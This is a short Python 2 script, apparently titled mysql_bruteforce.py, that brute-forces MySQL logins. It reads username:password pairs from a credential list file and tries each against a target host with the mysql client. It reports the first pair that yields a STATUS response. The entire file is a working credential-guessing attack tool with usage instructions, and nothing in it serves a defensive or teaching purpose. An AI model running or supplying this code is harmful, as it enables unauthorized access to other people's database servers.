import sys
import subprocess
import re

fo = open("credentiallist.txt", 'r');
for lines in fo:
        password = lines.split('\n')
        creds = password[0].split(':')
        if(len(sys.argv) == 2):
                command = "mysql -h {0} -u {1} -p{2} -e STATUS".format(sys.argv[1], creds[0], creds[1])
                brute = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
                if(re.search("Uptime", brute.communicate()[0])):
                        print "Password Cracked and your Username:Password is ", creds[0],":",creds[1]
                        exit()
        else:
                print "[+] Usage: \n\t[+] root@system# chmod u+x mysql_bruteforce.py\n\t[+] root@system# ./mysql_bruteforce.py ip_or_hostname_here"
                exit()
